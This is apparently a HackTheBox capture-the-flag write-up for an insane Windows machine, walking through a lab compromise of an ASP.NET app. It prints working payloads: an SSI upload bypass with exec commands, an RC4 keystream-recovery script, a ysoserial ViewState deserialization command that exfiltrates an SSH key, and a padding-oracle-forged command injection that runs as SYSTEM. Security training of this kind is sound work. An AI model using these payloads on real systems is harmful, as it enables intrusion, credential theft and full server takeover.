---
title: "Perspective"
date: 2026-09-05 09:00:00 -0500
categories: [HackTheBox, Windows]
tags: [hackthebox, insane, windows, ssi-injection, viewstate-deserialization, padding-oracle, rc4-keystream, aspnet, file-upload-bypass, command-injection]
description: "An IIS parts-catalog app processes .shtml files through Server-Side Includes regardless of Content-Type, leaking the ASP.NET machineKey from web.config. RC4 keystream reuse on a staging encrypt oracle decrypts the ViewStateUserKey; a TextFormattingRunProperties ViewState gadget exfills an SSH private key. An AES-CBC padding oracle on the internal staging app then forges a command-injection payload that runs as SYSTEM."
---
## Overview

Perspective is an Insane-difficulty Windows machine built around two independent cryptographic attack chains. The foothold abuses a split in upload validation: the web app checks Content-Type but not file extension, so a `.shtml` file passes the filter and IIS processes its Server-Side Include directives — leaking the ASP.NET `machineKey` from `web.config`. A second flaw, a static-key RC4 oracle on the staging app, yields the `ViewStateUserKey`, enabling a forged ViewState with the [TextFormattingRunProperties](https://cwe.mitre.org/data/definitions/502.html) gadget chain to achieve RCE. Privilege escalation chains a CBC [padding oracle](https://cwe.mitre.org/data/definitions/327.html) on an internal handler with an [OS command injection](https://cwe.mitre.org/data/definitions/78.html) sink to copy the root flag as SYSTEM.

## Recon

| Port | Service |
|------|---------|
| 22   | OpenSSH |
| 80   | IIS — perspective.htb (ASP.NET WebForms) |

```bash
nmap -sC -sV 10.129.227.158
```

Port 80 hosts `perspective.htb`, a parts-catalog / supplier portal built on ASP.NET WebForms. The app requires registration before uploading part images.

## Enumeration

After registering an account (Q1=1, Q2=5, Q3=9 security questions), the image upload endpoint at `/Account/UploadImage` accepts files and serves them back from `/Images/`. The upload filter checks `Content-Type` only — not the file extension — making `.shtml` bypass straightforward.

Uploading a probe and fetching it reveals SSI is active:

```bash
printf '<!--#echo var="APPL_PHYSICAL_PATH"--> <!--#exec cmd="whoami"-->' > /tmp/probe.shtml
curl -s -X POST 'http://10.129.227.158/Account/UploadImage' \
  -H 'Host: perspective.htb' -b /tmp/persp.txt \
  -F 'file=@/tmp/probe.shtml;type=image/jpeg'
curl -s 'http://10.129.227.158/Images/probe.shtml' -H 'Host: perspective.htb'
# → C:\WEBAPPS\PartImages_Prod\   iis apppool\perspective
```

A second probe reading `<!--#include file="web.config"-->` returns the `machineKey` block with static `validationKey` and `decryptionKey`, and shows `ViewStateUserKey` is set to an `ENC1:...` encrypted blob.

## Foothold

### Step 1 — RC4 keystream reuse → decrypt ViewStateUserKey

The internal staging app exposes a `/encrypt` endpoint that RC4-encrypts arbitrary input with a static key. Sending a known plaintext, XOR-ing the ciphertext with the plaintext recovers the raw keystream, which XOR-ed against the `ENC1:...` blob yields the plaintext `ViewStateUserKey`. This is a [stream cipher keystream reuse](https://cwe.mitre.org/data/definitions/330.html) — any stream cipher with a fixed, non-random key is broken the moment two ciphertexts share the same keystream.

```python
import requests, base64
r = requests.post('http://10.129.227.158/encrypt', json={'message': 'AAAAAAAAAAAAAAAAAAAA'})
ct  = bytes.fromhex(r.json()['ciphertext'])
ks  = bytes(a ^ b for a,b in zip(ct, b'AAAAAAAAAAAAAAAAAAAA'))
enc = bytes.fromhex('<ENC1_hex>')
print(bytes(a ^ b for a,b in zip(ks, enc)).decode())
# → SAltysAltYV1ewSTaT3
```

### Step 2 — ViewState deserialization RCE

With `validationKey`, `decryptionKey`, `__VIEWSTATEGENERATOR`, and the plaintext `ViewStateUserKey`, ysoserial.exe's `-p ViewState -g TextFormattingRunProperties` produces a signed ViewState embedding a WPF XAML `ObjectDataProvider → Process.Start` gadget chain. This is [deserialization of untrusted data](https://cwe.mitre.org/data/definitions/502.html) — ASP.NET's `LosFormatter` deserializes the ViewState payload during page lifecycle, instantiating the gadget chain.

```bash
WINEPREFIX=/home/kali/.wine_pov_dn48 WINEDEBUG=-all \
  wine /home/kali/.wine_pov_dn48/drive_c/ers/ysoserial.exe \
  -p ViewState -g TextFormattingRunProperties \
  -c "cmd.exe /c type C:\Users\webuser\.ssh\id_rsa > C:\WEBAPPS\PartImages_Prod\Images\idrsa.txt" \
  --decryptionalg=AES --generator=CD85D8D2 \
  --decryptionkey=<redacted> \
  --validationalg=SHA1 \
  --validationkey=<redacted> \
  --viewstateuserkey=SAltysAltYV1ewSTaT3 2>/dev/null \
  | tr -d '\r\n' | python3 -c "import sys,urllib.parse; print(urllib.parse.unquote(sys.stdin.read()))"
```

POST the URL-decoded output as `__VIEWSTATE` to `/Account/Login`. Both valid and invalid ViewStates return `302 → /500.html`, so confirm RCE by checking whether `/Images/idrsa.txt` appears.

```bash
curl -s 'http://10.129.227.158/Images/idrsa.txt' -H 'Host: perspective.htb' \
  > /home/kali/htb/perspective/loot/id_rsa
chmod 600 /home/kali/htb/perspective/loot/id_rsa
ssh -i /home/kali/htb/perspective/loot/id_rsa \
  -L 8009:127.0.0.1:8009 webuser@10.129.227.158
```

## User flag

```bash
cat C:\Users\Webuser\Desktop\user.txt
# HTB{...}
```

Shell lands as `webuser`. The SSH `-L 8009:127.0.0.1:8009` tunnel forwards the internal staging app.

## Privilege Escalation

### Padding oracle → ciphertext forgery → SYSTEM

`http://localhost:8009/handlers/changePassword.ashx` decrypts a `token` parameter with AES-CBC and returns the literal string `"Padding is invalid"` when PKCS#7 padding is wrong. This is a [CBC padding oracle](https://cwe.mitre.org/data/definitions/327.html): an attacker can submit modified ciphertexts and read the padding-valid/invalid signal to recover — or forge — any block of plaintext.

The decrypted token is passed directly to `PasswordReset.exe <email> <pass1> <pass2>` on the command line. The `&` metacharacter in `cmd.exe` separates commands, so a payload like `victim@x.com& copy root.txt webroot &` runs an extra command between the two `&` separators — this is [OS command injection](https://cwe.mitre.org/data/definitions/78.html). Because `PasswordReset.exe` runs under the IIS worker process as SYSTEM, the injected `copy` also runs as SYSTEM.

Create `perspective.ini`:
```ini
[default]
name = perspective
URL = http://localhost:8009/handlers/changePassword.ashx
httpMethod = POST
postFormat = form-urlencoded
inputMode = parameter
encodingMode = base64Url
vulnerableParameter = token
additionalParameters = {"password1":"S0meP@ss!","password2":"S0meP@ss!"}
blocksize = 16
httpProxyOn = False
ivMode = firstblock
iv = [0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]
oracleMode = negative
oracleText = Padding is invalid
```

```bash
pip3 install -q httpx validators
cd /home/kali/Desktop/Tools/pyOracle2
python3 blockbuster/blockbuster.py -m encrypt \
  -i "fake@x.com& copy C:\Users\Administrator\Desktop\root.txt C:\WEBAPPS\PartImages_Prod\Images\root.txt &" \
  -c /home/kali/htb/perspective/perspective.ini
```

PyOracle2 makes ~14,000 oracle queries (7 AES blocks × ~2,000 requests each) to forge the ciphertext. POST the result:

```bash
curl -s -X POST 'http://localhost:8009/handlers/changePassword.ashx' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'token=<pyoracle2_output>' \
  --data-urlencode 'password1=S0meP@ss!' \
  --data-urlencode 'password2=S0meP@ss!'
```

The response body contains `"1 file(s) copied."` — the SYSTEM copy succeeded.

## Root flag

```bash
curl -s 'http://10.129.227.158/Images/root.txt' -H 'Host: perspective.htb'
# HTB{...}
```

Full compromise via SYSTEM-level command injection through a forged AES-CBC padding-oracle ciphertext.
